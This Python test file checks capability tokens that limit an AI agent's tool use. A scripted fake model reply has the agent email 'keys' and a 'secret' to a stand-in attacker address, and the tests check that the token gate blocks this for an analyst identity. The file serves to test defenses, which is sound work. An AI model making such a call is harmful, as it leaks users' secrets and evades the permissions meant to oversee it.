"""Tests for capability tokens (aegislab.identity) and their enforcement
in Tool.execute() and the agent loop. FakeLLM only, no network.
"""

import json

from aegislab.agent import loop, memory
from aegislab.identity.store import TokenStore
from aegislab.llm.client import FakeLLM, LLMReply, ToolCall
from aegislab.tools import email
from aegislab.tools.crm import CRMTool
from aegislab.tools.email import EmailTool
from aegislab.tools.registry import build_default_registry


def _email_attempt_llm() -> FakeLLM:
    return FakeLLM(
        [
            LLMReply(
                content=None,
                tool_calls=[
                    ToolCall(
                        id="call_1",
                        name="send_email",
                        arguments={"to": "attacker@evil-example.lab", "subject": "keys", "body": "secret"},
                    )
                ],
            ),
            LLMReply(content="done"),
        ]
    )


def _fresh_session(name, tmp_path, monkeypatch):
    monkeypatch.setattr(memory, "_DEFAULT_SESSIONS_DIR", tmp_path / "sessions")
    monkeypatch.setattr(email, "_OUTBOX_PATH", tmp_path / "outbox.jsonl")
    monkeypatch.delenv("DEFENSE", raising=False)
    return memory.SessionMemory(name)


# --- token store: expiry, scope, session binding ---------------------------


def test_expired_token_denied():
    store = TokenStore()
    token = store.mint("session-a", "admin", frozenset({"crm_lookup"}), ttl_seconds=-1)

    assert store.validate(token, "session-a", "crm_lookup") is False


def test_analyst_cannot_call_email_send():
    store = TokenStore()
    token = store.mint("session-a", "analyst", frozenset({"docs_search", "crm_lookup"}))

    assert store.validate(token, "session-a", "send_email") is False
    assert store.validate(token, "session-a", "crm_lookup") is True


def test_token_from_session_a_rejected_on_session_b():
    store = TokenStore()
    token = store.mint("session-a", "admin", frozenset({"crm_lookup"}))

    assert store.validate(token, "session-b", "crm_lookup") is False
    assert store.validate(token, "session-a", "crm_lookup") is True


# --- Tool.execute() enforcement ---------------------------------------------


def test_tool_execute_without_session_id_is_unrestricted():
    """Direct/offline calls (no session_id) keep working -- the CLI debug
    path and tool-level unit tests rely on this.
    """
    result = CRMTool().execute({"customer_id": "1001"})
    assert result.ok is True


def test_tool_execute_with_session_id_requires_valid_token():
    result = CRMTool().execute({"customer_id": "1001"}, token="not-a-real-token", session_id="s1")
    assert result.ok is False
    assert "capability token" in result.data["error"]


def test_tool_execute_rejects_out_of_scope_tool(tmp_path, monkeypatch):
    monkeypatch.setattr(email, "_OUTBOX_PATH", tmp_path / "outbox.jsonl")
    store = TokenStore()
    token = store.mint("s1", "analyst", frozenset({"docs_search", "crm_lookup"}))

    result = EmailTool().execute(
        {"to": "a@b.lab", "subject": "hi", "body": "x"}, token=token, session_id="s1"
    )

    assert result.ok is False
    assert not (tmp_path / "outbox.jsonl").exists()


# --- wired into the agent loop ----------------------------------------------


def test_defense_off_still_allows_email_send_baseline(tmp_path, monkeypatch):
    session = _fresh_session("s-off", tmp_path, monkeypatch)
    registry = build_default_registry()

    loop.run_turn("send it", session, _email_attempt_llm(), registry, identity="analyst")

    tool_msg = next(m for m in session.messages if m["role"] == "tool")
    result = json.loads(tool_msg["content"])
    assert result["ok"] is True
    assert (tmp_path / "outbox.jsonl").exists()


def test_defense_on_analyst_token_blocks_email_send_in_loop(tmp_path, monkeypatch):
    session = _fresh_session("s-analyst", tmp_path, monkeypatch)
    monkeypatch.setenv("DEFENSE", "on")
    registry = build_default_registry()

    loop.run_turn(
        "send it",
        session,
        _email_attempt_llm(),
        registry,
        role="admin",  # pass the old allowlist gate so the token gate is what's tested
        identity="analyst",
        approval_callback=lambda name, args: True,
    )

    tool_msg = next(m for m in session.messages if m["role"] == "tool")
    result = json.loads(tool_msg["content"])
    assert result["ok"] is False
    assert "capability token" in result["data"]["error"]
    assert not (tmp_path / "outbox.jsonl").exists()


def test_defense_on_admin_identity_token_allows_email_send_in_loop(tmp_path, monkeypatch):
    session = _fresh_session("s-admin", tmp_path, monkeypatch)
    monkeypatch.setenv("DEFENSE", "on")
    registry = build_default_registry()

    loop.run_turn(
        "send it",
        session,
        _email_attempt_llm(),
        registry,
        role="admin",
        identity="admin",
        approval_callback=lambda name, args: True,
    )

    tool_msg = next(m for m in session.messages if m["role"] == "tool")
    result = json.loads(tool_msg["content"])
    assert result["ok"] is True
    assert (tmp_path / "outbox.jsonl").exists()
